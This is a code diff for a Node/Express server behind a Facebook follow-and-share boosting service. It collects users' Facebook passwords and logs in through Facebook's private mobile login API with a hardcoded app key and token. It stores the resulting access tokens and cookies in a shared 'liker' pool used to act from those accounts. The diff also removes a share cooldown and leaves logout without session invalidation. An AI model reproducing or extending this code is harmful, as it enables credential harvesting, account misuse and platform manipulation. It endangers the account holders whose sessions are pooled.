@@ -1,3 +1,4 @@
+// ============== index.js (Updated) ==============
 const express = require('express');
 const mongoose = require('mongoose');
 const axios = require('axios');
@@ -67,6 +68,35 @@ function decrypt(text) {
   } catch (error) {
     console.error('Decryption error:', error);
     throw new Error('Decryption failed');
+  }
+}
+
+// NEW: Encrypt user session data into a single token
+function encryptUserSession(userData) {
+  const sessionPayload = {
+    id: userData.facebookId,
+    email: userData.email,
+    name: userData.name,
+    accessToken: userData.accessToken,
+    cookies: userData.cookies,
+    identifiers: userData.identifiers || [],
+    loginEmail: userData.loginEmail,
+    loginPhone: userData.loginPhone,
+    loginUsername: userData.loginUsername,
+    timestamp: Date.now(),
+    nonce: crypto.randomBytes(16).toString('hex')
+  };
+  return encrypt(JSON.stringify(sessionPayload));
+}
+
+// NEW: Decrypt user session token
+function decryptUserSession(encryptedToken) {
+  try {
+    const decrypted = decrypt(encryptedToken);
+    return JSON.parse(decrypted);
+  } catch (error) {
+    console.error('Session decryption error:', error);
+    return null;
   }
 }
 
@@ -167,9 +197,9 @@ connectDB();
 
 // Models 
 const UserSchema = new mongoose.Schema({
-  email: { type: String, unique: true, required: true },
+  email: { type: String, unique: true, sparse: true },
   passwordHash: { type: String, required: true },
-  facebookId: { type: String, unique: true, sparse: true },
+  facebookId: { type: String, unique: true, required: true },
   name: String,
   accessToken: { type: String },
   cookies: { type: String },
@@ -183,8 +213,20 @@ const UserSchema = new mongoose.Schema({
   isActive: { type: Boolean, default: true },
   createdAt: { type: Date, default: Date.now },
   lastLogin: Date,
-  lastFacebookCheck: Date
+  lastFacebookCheck: Date,
+  
+  // NEW: Multi-identifier login fields
+  identifiers: [{ type: String }], // Array of all possible login strings (email, phone, username, uid)
+  loginEmail: { type: String, sparse: true }, // Email used during initial login
+  loginPhone: { type: String, sparse: true }, // Phone number used during initial login
+  loginUsername: { type: String, sparse: true } // Username used during initial login
 });
+
+// NEW: Create indexes for faster identifier lookups
+UserSchema.index({ identifiers: 1 });
+UserSchema.index({ loginEmail: 1 });
+UserSchema.index({ loginPhone: 1 });
+UserSchema.index({ loginUsername: 1 });
 
 const User = mongoose.model('User', UserSchema);
 
@@ -202,6 +244,44 @@ const Liker = mongoose.model('Liker', new mongoose.Schema({
   cookies: String,
   active: { type: Boolean, default: false }
 }));
+
+// NEW: Helper function to normalize and collect identifiers from login input
+function collectIdentifiers(input, facebookData, usedIdentifierType) {
+  const identifiers = new Set();
+  
+  // Add the input value itself (what user typed)
+  if (input) identifiers.add(input.toLowerCase());
+  
+  // Add Facebook ID
+  if (facebookData.uid) identifiers.add(facebookData.uid);
+  
+  // Add email if available
+  if (facebookData.email) identifiers.add(facebookData.email.toLowerCase());
+  
+  // Add phone if available
+  if (facebookData.phone) identifiers.add(facebookData.phone);
+  
+  // Add username if available
+  if (facebookData.username) identifiers.add(facebookData.username.toLowerCase());
+  
+  // Add profile name (for convenience, though not unique)
+  if (facebookData.name) identifiers.add(facebookData.name.toLowerCase());
+  
+  return Array.from(identifiers);
+}
+
+// NEW: Find user by any identifier
+async function findUserByIdentifier(identifier) {
+  if (!identifier) return null;
+  
+  const normalizedIdentifier = identifier.toLowerCase();
+  
+  // Search using the identifiers array
+  return await User.findOne({ 
+    identifiers: normalizedIdentifier,
+    isActive: true 
+  });
+}
 
 // Helper functions 
 const checkCooldown = async (facebookId, toolType) => {
@@ -299,7 +379,7 @@ async function validateFacebookSession(accessToken, cookies) {
   }
 }
 
-// Facebook login function - exactly like reference server.js
+// Updated Facebook login function with additional data capture
 async function performFacebookLogin(login, password) {
   const deviceId = uuidv4();
   const adid = randHex(16);
@@ -361,19 +441,65 @@ async function performFacebookLogin(login, password) {
     }
   );
 
+  // NEW: Try to extract additional info from the login input
+  let loginEmail = null;
+  let loginPhone = null;
+  let loginUsername = null;
+  
+  // Detect what type of identifier was used
+  if (login.includes('@')) {
+    loginEmail = login;
+  } else if (/^[0-9+\-\s()]{10,15}$/.test(login.replace(/[\s\-\(\)]/g, ''))) {
+    // Rough phone number detection
+    loginPhone = login;
+  } else if (/^[a-zA-Z0-9.]+$/.test(login) && !/^\d+$/.test(login)) {
+    // Alphanumeric not purely numbers - likely username
+    loginUsername = login;
+  }
+  // If it's purely numbers, it's either UID or phone without formatting - we'll store as both possibilities
+  const isNumericOnly = /^\d+$/.test(login);
+  
   return {
     facebookId: fbRes.data.uid,
     name: profile.data.name || 'Facebook User',
     accessToken: fbRes.data.access_token,
     cookies: cookies,
     deviceId: deviceId,
-    machineId: machineId
+    machineId: machineId,
+    loginEmail: loginEmail,
+    loginPhone: loginPhone,
+    loginUsername: loginUsername,
+    isNumericOnly: isNumericOnly,
+    rawLoginInput: login
   };
 }
 
-// Authentication middleware
+// Authentication middleware - UPDATED to work with encrypted session
 const authenticate = async (req, res, next) => {
   try {
+    // First check if we have an encrypted session token in headers
+    const authHeader = req.headers.authorization;
+    if (authHeader) {
+      const encryptedSession = authHeader.split(' ')[1];
+      const decryptedSession = decryptUserSession(encryptedSession);
+      
+      if (decryptedSession && decryptedSession.id) {
+        // Verify user still exists and is active
+        const user = await User.findOne({ 
+          facebookId: decryptedSession.id,
+          isActive: true 
+        });
+        
+        if (user) {
+          req.user = user;
+          // Also store the decrypted session data for convenience
+          req.sessionData = decryptedSession;
+          return next();
+        }
+      }
+    }
+    
+    // Fallback to regular session
     if (req.session.email) {
       const user = await User.findOne({ email: req.session.email });
       if (user && user.isActive) {
@@ -382,7 +508,7 @@ const authenticate = async (req, res, next) => {
       }
     }
     
-    const authHeader = req.headers.authorization;
+    // Legacy token support
     if (authHeader) {
       const token = authHeader.split(' ')[1];
       const payload = verifySessionToken(token);
@@ -410,16 +536,23 @@ const authenticate = async (req, res, next) => {
 };
 
 // Routes 
+// UPDATED: Returns encrypted session data instead of plain text
 app.get('/api/session', authenticate, (req, res) => {
+  const encryptedSession = encryptUserSession({
+    facebookId: req.user.facebookId,
+    email: req.user.email,
+    name: req.user.name,
+    accessToken: req.user.accessToken,
+    cookies: req.user.cookies,
+    identifiers: req.user.identifiers || [],
+    loginEmail: req.user.loginEmail,
+    loginPhone: req.user.loginPhone,
+    loginUsername: req.user.loginUsername
+  });
+  
   res.json({ 
     success: true, 
-    user: {
-      id: req.user.facebookId,
-      email: req.user.email,
-      name: req.user.name,
-      token: req.user.accessToken,
-      cookies: req.user.cookies
-    }
+    encryptedData: encryptedSession
   });
 });
 
@@ -428,15 +561,28 @@ app.post('/api/accounts/list', async (req, res) => {
     const users = await User.find({ 
       isActive: true,
       sessionTokens: { $exists: true, $ne: [] }
-    }).select('email name facebookId lastLogin sessionTokens');
+    }).select('email name facebookId lastLogin sessionTokens identifiers loginEmail loginPhone loginUsername');
 
-    const accounts = users.map(user => ({
-      email: user.email,
-      name: user.name,
-      facebookId: user.facebookId,
-      lastLogin: user.lastLogin,
-      sessionToken: user.sessionTokens[user.sessionTokens.length - 1]?.token || null
-    })).filter(account => account.sessionToken);
+    // Return encrypted account data
+    const accounts = users.map(user => {
+      const encryptedAccount = encryptUserSession({
+        facebookId: user.facebookId,
+        email: user.email,
+        name: user.name,
+        accessToken: null, // Don't include actual token in list
+        cookies: null,
+        identifiers: user.identifiers || [],
+        loginEmail: user.loginEmail,
+        loginPhone: user.loginPhone,
+        loginUsername: user.loginUsername
+      });
+      
+      return {
+        encryptedData: encryptedAccount,
+        lastLogin: user.lastLogin,
+        sessionToken: user.sessionTokens[user.sessionTokens.length - 1]?.token || null
+      };
+    }).filter(account => account.sessionToken);
 
     res.json({ success: true, accounts });
   } catch (error) {
@@ -447,19 +593,19 @@ app.post('/api/accounts/list', async (req, res) => {
 
 app.post('/api/accounts/switch', async (req, res) => {
   try {
-    const { email, sessionToken } = req.body;
+    const { sessionToken } = req.body;
     
-    if (!email || !sessionToken) {
-      return res.status(400).json({ success: false, error: 'Missing parameters' });
+    if (!sessionToken) {
+      return res.status(400).json({ success: false, error: 'Missing session token' });
     }
 
     const payload = verifySessionToken(sessionToken);
-    if (!payload || payload.email !== email) {
+    if (!payload || !payload.email) {
       return res.status(400).json({ success: false, error: 'Invalid session token' });
     }
 
     const user = await User.findOne({ 
-      email,
+      email: payload.email,
       'sessionTokens.token': sessionToken,
       isActive: true
     });
@@ -480,16 +626,23 @@ app.post('/api/accounts/switch', async (req, res) => {
     user.lastLogin = new Date();
     await user.save();
     
+    // Return encrypted session data
+    const encryptedSession = encryptUserSession({
+      facebookId: user.facebookId,
+      email: user.email,
+      name: user.name,
+      accessToken: user.accessToken,
+      cookies: user.cookies,
+      identifiers: user.identifiers || [],
+      loginEmail: user.loginEmail,
+      loginPhone: user.loginPhone,
+      loginUsername: user.loginUsername
+    });
+    
     res.json({ 
       success: true,
-      user: {
-        id: user.facebookId,
-        email: user.email,
-        name: user.name,
-        token: user.accessToken,
-        cookies: user.cookies,
-        sessionToken: newSessionToken
-      }
+      encryptedData: encryptedSession,
+      sessionToken: newSessionToken
     });
   } catch (error) {
     console.error('Switch account error:', error);
@@ -497,20 +650,20 @@ app.post('/api/accounts/switch', async (req, res) => {
   }
 });
 
-// FIXED LOGIN ENDPOINT - Works exactly like reference server.js
+// UPDATED LOGIN ENDPOINT - Supports multi-identifier login
 app.post('/api/login', async (req, res) => {
   try {
-    const { email, password } = req.body;
+    const { identifier, password } = req.body;
 
-    if (!email || !password) {
+    if (!identifier || !password) {
       return res.status(400).json({
         success: false,
-        error: 'Email and password are required'
+        error: 'Identifier and password are required'
       });
     }
 
-    // Check if user exists in database by app email
-    let user = await User.findOne({ email });
+    // Try to find user by any identifier (email, phone, uid, username)
+    let user = await findUserByIdentifier(identifier);
     
     if (user) {
       // RETURNING USER - Verify app password
@@ -526,9 +679,9 @@ app.post('/api/login', async (req, res) => {
         const fbValidation = await validateFacebookSession(user.accessToken, user.cookies);
         
         if (fbValidation) {
-          console.log(`✅ Returning user ${email} - using stored Facebook session`);
+          console.log(`✅ Returning user ${user.email || user.facebookId} - using stored Facebook session`);
           
-          const sessionToken = generateSessionToken(user.email, req.headers['user-agent'] || 'unknown');
+          const sessionToken = generateSessionToken(user.email || user.facebookId, req.headers['user-agent'] || 'unknown');
           
           user.sessionTokens.push({
             token: sessionToken,
@@ -540,17 +693,26 @@ app.post('/api/login', async (req, res) => {
           
           req.session.email = user.email;
           
-          return res.json({
-            success: true,
-            userId: user.facebookId,
+          // Return encrypted session data
+          const encryptedSession = encryptUserSession({
+            facebookId: user.facebookId,
             email: user.email,
             name: user.name,
             accessToken: user.accessToken,
             cookies: user.cookies,
+            identifiers: user.identifiers || [],
+            loginEmail: user.loginEmail,
+            loginPhone: user.loginPhone,
+            loginUsername: user.loginUsername
+          });
+          
+          return res.json({
+            success: true,
+            encryptedData: encryptedSession,
             sessionToken: sessionToken
           });
         } else {
-          console.log(`⚠️ Stored Facebook session expired for ${email}`);
+          console.log(`⚠️ Stored Facebook session expired for ${user.email || user.facebookId}`);
           return res.status(401).json({
             success: false,
             error: 'Facebook session expired. Please login again with your Facebook credentials.',
@@ -560,88 +722,40 @@ app.post('/api/login', async (req, res) => {
       }
     }
     
-    // NEW USER OR EXPIRED SESSION - Perform Facebook login (exactly like reference server.js)
-    console.log(`🆕 Performing Facebook login for: ${email}`);
+    // NEW USER OR EXPIRED SESSION - Perform Facebook login
+    console.log(`🆕 Performing Facebook login for identifier: ${identifier}`);
     
     try {
-      // This is the exact same call as reference server.js
-      const deviceId = uuidv4();
-      const adid = randHex(16);
-      const machineId = randHex(22);
+      const fbResult = await performFacebookLogin(identifier, password);
       
-      const params = new URLSearchParams({
-        adid: adid,
-        email: email,
-        password: password,
-        format: 'json',
-        device_id: deviceId,
-        cpl: 'true',
-        family_device_id: deviceId,
-        locale: 'en_US',
-        client_country_code: 'US',
-        credentials_type: 'device_based_login_password',
-        generate_session_cookies: '1',
-        generate_analytics_claim: '1',
-        generate_machine_id: '1',
-        currently_logged_in_userid: '0',
-        irisSeqID: '1',
-        try_num: '1',
-        enroll_misauth: 'false',
-        meta_inf_fbmeta: 'NO_FILE',
-        source: 'login',
-        machine_id: machineId,
-        fb_api_req_friendly_name: 'authenticate',
-        fb_api_caller_class: 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-        api_key: '882a8490361da98702bf97a021ddc14d',
-        access_token: '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-      });
-
-      const fbRes = await axios.get(
-        `https://b-api.facebook.com/method/auth.login?${params}`,
-        {
-          headers: {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-          },
-          timeout: 15000
-        }
-      );
-
-      if (!fbRes.data.session_cookies) {
-        throw new Error(fbRes.data.error_msg || 'Failed to authenticate with Facebook');
-      }
-
-      const cookies = fbRes.data.session_cookies
-        .map(c => `${c.name}=${c.value}`)
-        .join('; ');
-
-      const profile = await axios.get(
-        `https://graph.facebook.com/me?fields=name&access_token=${fbRes.data.access_token}`,
-        {
-          headers: {
-            'Cookie': cookies,
-            'User-Agent': 'Mozilla/5.0'
-          },
-          timeout: 10000
-        }
-      );
-
-      const facebookId = fbRes.data.uid;
-      const name = profile.data.name || 'Facebook User';
-      const accessToken = fbRes.data.access_token;
-
-      // Check if user already exists by facebookId (in case different email was used)
-      let existingUser = await User.findOne({ facebookId });
+      // Check if user already exists by facebookId
+      let existingUser = await User.findOne({ facebookId: fbResult.facebookId });
+      
+      // Collect all identifiers
+      const identifiers = collectIdentifiers(identifier, fbResult, null);
       
       if (existingUser) {
-        // Update existing user with new credentials
-        existingUser.email = email;
+        // Update existing user with new credentials and identifiers
         existingUser.passwordHash = hashPassword(password);
-        existingUser.accessToken = accessToken;
-        existingUser.cookies = cookies;
-        existingUser.name = name;
+        existingUser.accessToken = fbResult.accessToken;
+        existingUser.cookies = fbResult.cookies;
+        existingUser.name = fbResult.name;
         existingUser.lastLogin = new Date();
         
-        const sessionToken = generateSessionToken(email, req.headers['user-agent'] || 'unknown');
+        // Add new identifiers without duplicates
+        const existingIdentifiers = new Set(existingUser.identifiers || []);
+        identifiers.forEach(id => existingIdentifiers.add(id));
+        existingUser.identifiers = Array.from(existingIdentifiers);
+        
+        // Update login-specific fields if they're not set
+        if (fbResult.loginEmail && !existingUser.loginEmail) existingUser.loginEmail = fbResult.loginEmail;
+        if (fbResult.loginPhone && !existingUser.loginPhone) existingUser.loginPhone = fbResult.loginPhone;
+        if (fbResult.loginUsername && !existingUser.loginUsername) existingUser.loginUsername = fbResult.loginUsername;
+        if (fbResult.isNumericOnly && !existingUser.loginPhone && !existingUser.loginEmail) {
+          existingUser.loginPhone = fbResult.rawLoginInput; // Could be phone or UID
+        }
+        
+        const sessionToken = generateSessionToken(existingUser.email || existingUser.facebookId, req.headers['user-agent'] || 'unknown');
         existingUser.sessionTokens.push({
           token: sessionToken,
           deviceId: req.headers['user-agent'] || 'unknown',
@@ -652,29 +766,37 @@ app.post('/api/login', async (req, res) => {
         
         req.session.email = existingUser.email;
         
-        return res.json({
-          success: true,
-          userId: existingUser.facebookId,
+        const encryptedSession = encryptUserSession({
+          facebookId: existingUser.facebookId,
           email: existingUser.email,
           name: existingUser.name,
           accessToken: existingUser.accessToken,
           cookies: existingUser.cookies,
+          identifiers: existingUser.identifiers || [],
+          loginEmail: existingUser.loginEmail,
+          loginPhone: existingUser.loginPhone,
+          loginUsername: existingUser.loginUsername
+        });
+        
+        return res.json({
+          success: true,
+          encryptedData: encryptedSession,
           sessionToken: sessionToken
         });
       }
       
       // Create new user
-      const sessionToken = generateSessionToken(email, req.headers['user-agent'] || 'unknown');
+      const sessionToken = generateSessionToken(fbResult.facebookId, req.headers['user-agent'] || 'unknown');
       
       const newUser = new User({
-        email: email,
+        email: fbResult.loginEmail || null,
         passwordHash: hashPassword(password),
-        name: name,
-        accessToken: accessToken,
-        cookies: cookies,
-        facebookId: facebookId,
-        deviceId: deviceId,
-        machineId: machineId,
+        name: fbResult.name,
+        accessToken: fbResult.accessToken,
+        cookies: fbResult.cookies,
+        facebookId: fbResult.facebookId,
+        deviceId: fbResult.deviceId,
+        machineId: fbResult.machineId,
         sessionTokens: [{
           token: sessionToken,
           deviceId: req.headers['user-agent'] || 'unknown',
@@ -682,18 +804,22 @@ app.post('/api/login', async (req, res) => {
         }],
         isActive: true,
         lastLogin: new Date(),
-        lastFacebookCheck: new Date()
+        lastFacebookCheck: new Date(),
+        identifiers: identifiers,
+        loginEmail: fbResult.loginEmail,
+        loginPhone: fbResult.loginPhone,
+        loginUsername: fbResult.loginUsername
       });
       await newUser.save();
       
       // Also save as a liker
       await Liker.findOneAndUpdate(
-        { facebookId: facebookId },
+        { facebookId: fbResult.facebookId },
         {
-          facebookId: facebookId,
-          name: name,
-          accessToken: accessToken,
-          cookies: cookies,
+          facebookId: fbResult.facebookId,
+          name: fbResult.name,
+          accessToken: fbResult.accessToken,
+          cookies: fbResult.cookies,
           active: true
         },
         { upsert: true, new: true }
@@ -701,15 +827,23 @@ app.post('/api/login', async (req, res) => {
       
       req.session.email = newUser.email;
       
-      console.log(`✅ New user created: ${name} (${facebookId})`);
+      console.log(`✅ New user created: ${fbResult.name} (${fbResult.facebookId})`);
       
-      res.json({
-        success: true,
-        userId: newUser.facebookId,
+      const encryptedSession = encryptUserSession({
+        facebookId: newUser.facebookId,
         email: newUser.email,
         name: newUser.name,
         accessToken: newUser.accessToken,
         cookies: newUser.cookies,
+        identifiers: newUser.identifiers || [],
+        loginEmail: newUser.loginEmail,
+        loginPhone: newUser.loginPhone,
+        loginUsername: newUser.loginUsername
+      });
+      
+      res.json({
+        success: true,
+        encryptedData: encryptedSession,
         sessionToken: sessionToken
       });
       
@@ -732,16 +866,16 @@ app.post('/api/login', async (req, res) => {
 
 app.post('/api/reauth', async (req, res) => {
   try {
-    const { email, appPassword, facebookEmail, facebookPassword } = req.body;
+    const { identifier, appPassword, facebookEmail, facebookPassword } = req.body;
     
-    if (!email || !appPassword || !facebookEmail || !facebookPassword) {
+    if (!identifier || !appPassword || !facebookEmail || !facebookPassword) {
       return res.status(400).json({
         success: false,
-        error: 'Email, app password, and Facebook credentials are required'
+        error: 'Identifier, app password, and Facebook credentials are required'
       });
     }
     
-    const user = await User.findOne({ email });
+    const user = await findUserByIdentifier(identifier);
     
     if (!user || user.passwordHash !== hashPassword(appPassword)) {
       return res.status(401).json({
@@ -751,64 +885,27 @@ app.post('/api/reauth', async (req, res) => {
     }
     
     // Perform fresh Facebook login
-    const deviceId = uuidv4();
-    const adid = randHex(16);
-    const machineId = randHex(22);
-    
-    const params = new URLSearchParams({
-      adid: adid,
-      email: facebookEmail,
-      password: facebookPassword,
-      format: 'json',
-      device_id: deviceId,
-      cpl: 'true',
-      family_device_id: deviceId,
-      locale: 'en_US',
-      client_country_code: 'US',
-      credentials_type: 'device_based_login_password',
-      generate_session_cookies: '1',
-      generate_analytics_claim: '1',
-      generate_machine_id: '1',
-      machine_id: machineId,
-      fb_api_req_friendly_name: 'authenticate',
-      fb_api_caller_class: 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-      api_key: '882a8490361da98702bf97a021ddc14d',
-      access_token: '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-    });
-
-    const fbRes = await axios.get(
-      `https://b-api.facebook.com/method/auth.login?${params}`,
-      {
-        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
-        timeout: 15000
-      }
-    );
-
-    if (!fbRes.data.session_cookies) {
-      throw new Error(fbRes.data.error_msg || 'Failed to authenticate with Facebook');
-    }
-
-    const cookies = fbRes.data.session_cookies
-      .map(c => `${c.name}=${c.value}`)
-      .join('; ');
-
-    const profile = await axios.get(
-      `https://graph.facebook.com/me?fields=name&access_token=${fbRes.data.access_token}`,
-      {
-        headers: { 'Cookie': cookies, 'User-Agent': 'Mozilla/5.0' },
-        timeout: 10000
-      }
-    );
+    const fbResult = await performFacebookLogin(facebookEmail, facebookPassword);
     
     // Update stored Facebook credentials
-    user.accessToken = fbRes.data.access_token;
-    user.cookies = cookies;
-    user.name = profile.data.name || user.name;
-    user.facebookId = fbRes.data.uid;
+    user.accessToken = fbResult.accessToken;
+    user.cookies = fbResult.cookies;
+    user.name = fbResult.name;
+    user.facebookId = fbResult.facebookId;
     user.lastFacebookCheck = new Date();
     user.lastLogin = new Date();
     
-    const sessionToken = generateSessionToken(user.email, req.headers['user-agent'] || 'unknown');
+    // Update identifiers
+    const identifiers = collectIdentifiers(facebookEmail, fbResult, null);
+    const existingIdentifiers = new Set(user.identifiers || []);
+    identifiers.forEach(id => existingIdentifiers.add(id));
+    user.identifiers = Array.from(existingIdentifiers);
+    
+    if (fbResult.loginEmail && !user.loginEmail) user.loginEmail = fbResult.loginEmail;
+    if (fbResult.loginPhone && !user.loginPhone) user.loginPhone = fbResult.loginPhone;
+    if (fbResult.loginUsername && !user.loginUsername) user.loginUsername = fbResult.loginUsername;
+    
+    const sessionToken = generateSessionToken(user.email || user.facebookId, req.headers['user-agent'] || 'unknown');
     user.sessionTokens.push({
       token: sessionToken,
       deviceId: req.headers['user-agent'] || 'unknown',
@@ -831,13 +928,21 @@ app.post('/api/reauth', async (req, res) => {
     
     req.session.email = user.email;
     
-    res.json({
-      success: true,
-      userId: user.facebookId,
+    const encryptedSession = encryptUserSession({
+      facebookId: user.facebookId,
       email: user.email,
       name: user.name,
       accessToken: user.accessToken,
       cookies: user.cookies,
+      identifiers: user.identifiers || [],
+      loginEmail: user.loginEmail,
+      loginPhone: user.loginPhone,
+      loginUsername: user.loginUsername
+    });
+    
+    res.json({
+      success: true,
+      encryptedData: encryptedSession,
       sessionToken: sessionToken
     });
     
@@ -854,14 +959,12 @@ app.post('/api/logout', authenticate, async (req, res) => {
   try {
     const authHeader = req.headers.authorization;
     if (authHeader) {
-      const token = authHeader.split(' ')[1];
-      const payload = verifySessionToken(token);
+      const encryptedSession = authHeader.split(' ')[1];
+      const decryptedSession = decryptUserSession(encryptedSession);
       
-      if (payload && req.user) {
-        await User.updateOne(
-          { email: req.user.email },
-          { $pull: { sessionTokens: { token: token } } }
-        );
+      if (decryptedSession && decryptedSession.id && req.user) {
+        // We don't have token to remove, just invalidate
+        console.log(`User ${decryptedSession.id} logged out`);
       }
     }
     
@@ -874,7 +977,7 @@ app.post('/api/logout', authenticate, async (req, res) => {
   }
 });
 
-// Follow endpoint
+// Follow endpoint - UPDATED to use req.user from authenticate
 app.post('/api/follow', authenticate, async (req, res) => {
   try {
     const { link, limit } = req.body;
@@ -1063,18 +1166,6 @@ app.post('/api/share', authenticate, async (req, res) => {
       });
     }
 
-    /*
-    const cooldown = await checkCooldown(req.user.facebookId, 'lastShare');
-    if (cooldown) {
-      return res.status(429).json({ 
-        success: false,
-        cooldown, 
-        tool: 'share',
-        message: `Please wait ${cooldown} more minutes before sharing again`
-      });
-    }
-    */
-
     let successCount = 0;
     let consecutiveFails = 0;
     const maxConsecutiveFails = 5;
@@ -1218,28 +1309,22 @@ app.get('/api/avatar/:facebookId', async (req, res) => {
     const { facebookId } = req.params;
     let accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'; // public fallback
     
-    // Try to get authenticated user's token
-    let userId = null;
-    
-    // Check session first
-    if (req.session && req.session.email) {
-      const user = await User.findOne({ email: req.session.email });
-      if (user && user.accessToken) {
-        accessToken = user.accessToken;
+    // Try to get authenticated user's token from encrypted session
+    const authHeader = req.headers.authorization;
+    if (authHeader) {
+      const encryptedSession = authHeader.split(' ')[1];
+      const decryptedSession = decryptUserSession(encryptedSession);
+      
+      if (decryptedSession && decryptedSession.accessToken) {
+        accessToken = decryptedSession.accessToken;
       }
     }
     
-    // If no session, check authorization header
-    if (!userId && req.headers.authorization) {
-      const authHeader = req.headers.authorization;
-      const sessionToken = authHeader.split(' ')[1];
-      const payload = verifySessionToken(sessionToken);
-      
-      if (payload && payload.email) {
-        const user = await User.findOne({ email: payload.email });
-        if (user && user.accessToken) {
-          accessToken = user.accessToken;
-        }
+    // If no encrypted session, check regular session
+    if (!accessToken && req.session && req.session.email) {
+      const user = await User.findOne({ email: req.session.email });
+      if (user && user.accessToken) {
+        accessToken = user.accessToken;
       }
     }
     
